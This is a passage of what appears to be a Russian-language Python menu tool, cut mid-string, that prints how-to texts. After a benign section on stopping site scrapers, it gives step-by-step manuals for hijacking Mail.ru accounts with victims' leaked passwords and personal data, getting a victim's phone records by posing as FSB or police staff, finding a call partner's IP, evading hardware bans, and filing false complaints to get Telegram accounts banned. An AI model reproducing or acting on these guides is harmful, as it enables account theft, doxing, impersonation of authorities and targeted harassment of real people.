Проблема парсинга данных и злонамеренных атак встает перед владельцем своего веб-ресурса довольно часто, однако не стоит на месте и развитие способов защиты. Чтобы защититься от копирования и воровства данных сайта можно пойти несколькими путями, например установить на страницу капчу, вписать в код ловушку, или отслеживать ботов по данным User-Agent с последующей блокировкой. Внимательное отношение к аналитике и установка средств защиты даже при минимальной работе с кодом поможет решить проблему парсинга, спама и нагрузки на сайт. 

Профессиональная защита сайта - BotGuard

Блокировка в htaccess и robots.txt

Ловушка для ботов
Для блокировки парсеров можно использовать так называемые ханипоты (honeypot, или “горшочек с медом”) - специальные приманки, вписанные в HTML код, которые выдают на запрос на поиск информации парсера определенный результат, открыв который парсер закроет себе доступ к сайту. 

Использование аутентификации
Это хороший метод защиты для сайтов, в которых используются учетные записи пользователей. Если для просмотра содержимого сайта требуется вход с подтверждением телефона или почты с помощью кода проверки, большое количество ботов будет отсеиваться. Такой порядок действий, требуемых для входа, для любого бота будет слишком сложным. Однако минус в том, что такая система работает не для любого формата веб-ресурса, и для многих пользователей регистрация на сайте, куда они попали в первый раз, покажется излишней.

Использование reCAPTCHA
Пожалуй, наиболее простой и адекватный способ защиты от ботов на данный момент. Простой тест Тьюринга, например сервис от Google reCAPTCHA, позволяет выяснить, пытается ли зайти на сайт реальный человек, или робот. Формат теста может быть как текстовый, так и графический (второй вариант удобнее для пользователей и сложнее обойти ботам). Лучше всего совмещать сервис с использованием cookies, чтобы сохранять результаты от уже подтвердивших свою “человечность” посетителей, и не заставлять их проходить тест каждый раз, когда они заходят на вашу страницу. Однако важно учесть, что на сегодняшний день существуют сервисы, которые помогают обходить любые типы капч, поэтому в некоторых случаях этот способ может не сработать, хотя в большинстве все же выступит хорошей защитой.

Запрет на копирование
Этот способ является рабочим скорее в случае не с роботами, а с живыми людьми, которые намереваются скопировать текст с вашего сайта. В код страницы добавляется скрипт, который не позволяет сохранить текст в буфер обмена. Таким образом копипастер не сможет скопировать и вставить текстовую информацию, и если он не владеет навыками работы с кодом, скорее всего уйдет с вашего сайта ни с чем. Однако от парсинга такой метод существенно не поможет.
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '87':
             print(Colorate.Vertical(Colors.cyan_to_green, """
SmsSniff. Скачиваем программу отсюда. https://happy-hack.ru/other/10560-smsniff.html 
Открываем программу, нажимаем на зеленую кнопку. 
Которая находится где файл. 
Начинаем разговор с человеком, включаем програмку нажимаем зеленую кнопку. 
Она выдает вам айпи, берем и проверяем каждые айпи. 
Если с первого раза не получиться, пробуйте ещё раз. 
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '88':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Анонимность в "Интернете" для чего она же нужна?Ну сперва начнем с того что, анонимность нужна для избежания попадания валид(настоящих) данных в сеть.
Как же себя обезопасить, желательно использовать фейк данные при регистрации в соц сети,либо иметь два аккаунта в соц сетях.Например у нас есть основной аккаунт "Даша Василькова" там у нас все друзья,работа,школа и так далее.
А нам нужен ещё второй аккаунт для безопасности в интернете,чтобы общаться со второй личности о которой будут не будут знать другие люди.Что же нам нужно чтобы стать анонимным в соц сетях на так называемой "Второй личности".                       
Мессенджер Вк(ВКонтакте) довольно популярный мессенджер с общим количеством пользователей 100 миллионов,в котором есть Деанонеры которые могут вас с "Деанонить".Как обезопасить себя от мамкиных Деанонеров.

Открываем мессенджер "телеграмм" и в поисковой строке вбиваем @AuroraSMS_bot/@SMSBest_bot в любом боте пополняем баланс на на 8-25₽ столько стоит виртудь номер для ВКонтакте.Покупаем номер далее скачиваем любой впн самый обычный простой например:Turbo VPN,VPN proxy speed и ТД.
Включаем VPN далее скачиваем приложение "2 Accounts"Далее после скачивания делаем всё как сказано.
Покупаем виртуальный номер на ВКонтакте,копируем номер,включаем впн и регион Швейцария, заходим в 2 accounts,добавляем приложение ВКонтакте нажимаем на него и входим через 2 accounts,так у нас появилось клон ВКонтакте, нажимаем зарегистрироваться главное делать все с VPN,вводим наш виртуальный номер,смотрим бота в котором пришел код, далее после успешного ввода кода,вводим не настоящую имя и фамилию, город тоже фейковый и страну,место работы и ТД тоже фейк и дату рождения.На аватарку себя не ставим профиль закрываем это не кринж это безопасность!И воля мы в ВК анонимны, входим теперь всегда через  2 accounts в ВКонтакте.

Telegramm:Теперь нам надо по другому,берём телефон друга, заходим в боты @GreedySMSbot(Best)@AuroraSMS_bot @SMSBest_bot пополняем баланс на ,17-50₽ столько стоит хороший виртуальный номер,покупаем виртуальный номер на аккаунте друга,на своем телефоне удаляем телеграмм и скачиваем чистый телеграмм с Play Market, включаем впн заходим в телеграмм копируем наш виртуальный номер вставляем получаем код и регистрируем с VPN телеграмм аккаунт.Все мы зарегистрировали телеграмм аккаунт.Заходим в настройки телеграмм конфиденциальность и в пересылке сообщение ставим никто.Номер телефона,ставим никто,при добавлении в контакты людей ставим не показывать номер телефона.



Всегда желательно использовать VPN,не давать не кому номер телефона, при регистрации использовать виртуальный номер!
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '89':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Сегодня я хочу поделиться информацией о том, как обойти блокировку и какие программы для этого можно использовать.
--------------------------------------------
Для начала, чтобы сменить IP-адрес, вы можете перезагрузить роутер, если у вас динамический IP, или связаться с провайдером, если у вас статический IP.
--------------------------------------------
Далее, вы можете использовать программу TMAC v6 для смены MAC-адреса. Вы можете скачать ее по следующей ссылке: [https://technitium.com/tmac/]
--------------------------------------------
После установки программы, отметьте опцию "Use '02' as first octet of MAC address" и нажмите "Random MAC address". Затем нажмите "Change Now!".
--------------------------------------------
Далее, вы можете изменить HWID с помощью программы HardDiskSerialNumberChanger. Вы можете скачать ее по следующей ссылке: [https://disk.yandex.com/d/y-W_2T31mofg1w]

Запустите программу, выберите диск и введите любое значение в поле формата "XXXX-XXX". Повторите эту операцию для всех ваших дисков. Важно также изменить серийный номер материнской платы и UUID.
--------------------------------------------
Для этого вы можете использовать программу GRINX64v2, которую также можно скачать по ссылке: [https://disk.yandex.com/d/HRZZ2NYbdZ7wRw]

Разархивируйте папку из архива на рабочий стол. Затем откройте папку и скопируйте ее путь.

Запустите командную строку (CMD) от имени администратора и введите следующую команду: "cd [путь до папки]".

Затем введите команду "AMIDEWINx64.EXE /SU /BS" для изменения UUID.

Чтобы изменить серийный номер материнской платы, введите команду "AMIDEWINx64.EXE /BS [Ваш серийный номер материнской платы]" и измените последние 2-4 цифры на любые другие.

После этого нажмите "ENTER".
--------------------------------------------
И последнее переустановить Windows.

Поздравляю, блокировка по аппаратным характеристикам была обойдена, и вы можете продолжать играть.
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '90':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Взлом аккаунтов майлру. Пост несет ознакомительный характер и НЕ ПРИЗЫВАЕТ К ДЕЙСТВИЯМ

Подготовка
1. Смотрим привязанный к майлру почте мой мир. Оттуда извлекаем ФИ и ДР как там указано.
2. С помощью ботов смотрим привязанные к почте номера. 
3. Смотрим все пароли, которые слиты. Вы нашли клад если их больше пяти. 
4. Желательно иметь адрес и паспорт жертвы, но адреса и родственников достаточно.

Сам процесс
1. Нажимаем восстановить пароль через техподдержку
2. В полях ФИ и ДР указываем ФИ и ДР.
3. Ответ на секретный вопрос выбирайте хоть паспорт, главное знать его.
4. Указываем привязанные к аккаунту номера и пароли, которые когда-либо были. Указываем почту, на которую придет письмо, желательно майлру, или создайте новую с такой же фамилией.
5. Отправляете заявку. В течении 24 часов придет письмо с ссылкой на восстановление. 

Если не получилось
1. Пишем ТП и играем на чувствах, убеждаете что это точно Я. 
2. Иногда просят проверку по скану паспорта, но мы этого не одобряем
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '91':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Здравствуйте, в этом мануале я расскажу вам как вытянуть логи с виртуального номера

Что такое логи? - Логи это текстовые файлы, в которых хранится информация о пользователях,
их взаимодействии с сервером, а также системная информация о работе сервера. Логи формируются в автоматическом
режиме и сохраняются в хронологическом порядке. Поэтому их также называют
журналом сервера (Server Logs)

1 Способ: Ну так как же достать логи? - Для этого нужно знать виртуальный номер жертвы. (не обязательно виртуальный можно и его валид номер)

После того как мы узнали виртуальный номер надо узнать где он купил номер и в каком именно сервисе. Например гриди. С основного аккаунта не пишем оформляем его типо вы фсбшники пример: Федеральная Служба Поддержки.
Когда мы узнали в каком сервисе он купил этот номер пишем этому сервису данное сообщение: Здравствуйте, ведется расследование. Скажите с какого номера был приобретен данный виртуальный номер? (Номер жертвы)
После этого нам скидывают всю информацию о этом номере.

2 Способ: Для этого нам тоже понадобится номер жертвы. (Виртуальный или нет без разницы главное не физ)

Потом пишем в поддержку и в на различные сайты от почты мвд. для этого отлично подойдет @OCMT_bot хороший в своем деле и дешевые цены.
Либо можно использовать любой бот со спуфером.

Благодарю за прочтение данного мануала
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '92':
             print(Colorate.Vertical(Colors.cyan_to_green, """
@parsetgbot
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '94':
             print(Colorate.Vertical(Colors.cyan_to_green, """
-----------------------------------------------
Все способы сноса:
Основной материал:

Почты для отправки жалоб:
abuse@telegram.org,
DMCA@telegram.org,
support@telegram.org,
ceo@telegram.org,
recover@telegram.org,
spam@telegram.org

Ускоренные жалобы:
http://telegram.org/support
----------------------------------------------- 

-----------------------------------------------
#1 Снос аккаунтов с помощью почт

Нумерация:

#a1 (клик)
#a2 (клик)
#a3 (клик)
-----------------------------------------------

-----------------------------------------------
#a1 / Снос аккаунта на виртуальном/физическом номере

Добрый день поддержка Telegram!

Аккаунт (тег/айди) использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться.

Прошу разберитесь с этим. Заранее спасибо!
-----------------------------------------------

-----------------------------------------------
#a2 / Снос аккаунта который в поле "О себе" имеет стороннюю ссылку (bio.link и пр.)

Добрый день поддержка Telegram!

Аккаунт (тег/айди) ссылает людей на сторонний сервис. Оставив в поле "О себе" ссылку на другой сервис он ссылает туда людей с вашего мессенджера!

Прошу проверить и разобраться! Заранее спасибо
-----------------------------------------------

-----------------------------------------------
#a3 / Снос аккаунта с премиумом

Добрый день поддержка Telegram!

Аккаунт (тег/айди) приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram.

Прошу проверить данную жалобу и принять меры!
-----------------------------------------------
"""))
             input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '100':
                break
